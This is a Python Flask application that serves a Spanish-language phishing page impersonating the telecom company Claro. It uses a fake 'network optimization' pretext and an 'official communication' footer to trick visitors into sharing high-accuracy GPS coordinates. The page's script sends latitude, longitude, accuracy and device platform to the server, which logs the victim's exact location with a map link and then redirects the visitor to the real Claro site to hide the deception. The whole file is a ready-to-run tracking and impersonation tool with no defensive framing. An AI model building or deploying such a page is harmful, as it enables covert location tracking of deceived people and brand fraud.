from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# Diseño de página de Claro Telecomunicaciones
HTML_CODE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validación de Usuario | Claro</title>
    <style>
        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #e5e5e5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: white; border-radius: 2px; border-top: 6px solid #DA281C; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 450px; width: 95%; overflow: hidden; }
        .header { padding: 20px; background: #fff; }
        .claro-logo { color: #DA281C; font-size: 32px; font-weight: 900; letter-spacing: -1px; margin-bottom: 5px; }
        .claro-logo span { font-weight: 300; font-size: 14px; color: #333; display: block; margin-top: -5px; }
        .content { padding: 30px; }
        .icon { font-size: 50px; color: #DA281C; margin-bottom: 15px; }
        h2 { color: #333; font-size: 20px; margin-bottom: 10px; }
        p { color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 25px; padding: 0 10px; }
        .btn { background: #DA281C; color: white; border: none; padding: 15px 30px; border-radius: 25px; font-weight: bold; cursor: pointer; width: 80%; font-size: 16px; transition: 0.3s; text-transform: uppercase; }
        .btn:hover { background: #b01f15; transform: scale(1.02); }
        .footer { background: #f9f9f9; padding: 15px; font-size: 11px; color: #999; border-top: 1px solid #eee; }
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <div class="claro-logo">Claro<span>Centro de Atención Virtual</span></div>
        </div>
        <div class="content">
            <div class="icon">📡</div>
            <h2>Optimización de Red Solicitada</h2>
            <p>Para mejorar la calidad de su señal y completar la vinculación con nuestro servicio técnico, necesitamos <b>verificar su zona de cobertura actual.</b></p>
            <button class="btn" onclick="solicitarGPS()">Validar Mi Conexión</button>
        </div>
        <div class="footer">
            © 2026 Claro Telecomunicaciones. Esta es una comunicación oficial para el soporte de servicios móviles y hogar.
        </div>
    </div>

    <script>
        function solicitarGPS() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch("/log_gps", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            acc: pos.coords.accuracy,
                            plat: navigator.platform
                        })
                    }).then(() => {
                        alert("Validación completada. Un asesor de Claro se pondrá en contacto en breve.");
                        window.location.href = "https://www.claro.com.co";
                    });
                }, e => {
                    alert("Error: Es necesario activar el GPS para validar la cobertura de red de su sector.");
                }, {enableHighAccuracy: true});
            }
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_CODE)

@app.route("/log_gps", methods=["POST"])
def log_gps():
    data = request.json
    print(f"\n[📡 CLARO INFO] CONEXIÓN DETECTADA")
    print(f"[📱] Dispositivo: {data.get('plat', 'Móvil')}")
    print(f"[🎯] Ubicación Exacta: {data['lat']}, {data['lon']}")
    print(f"[📏] Margen de Error: {data['acc']} metros")
    print(f"[🔗] Google Maps: https://www.google.com/maps?q={data['lat']},{data['lon']}")
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
    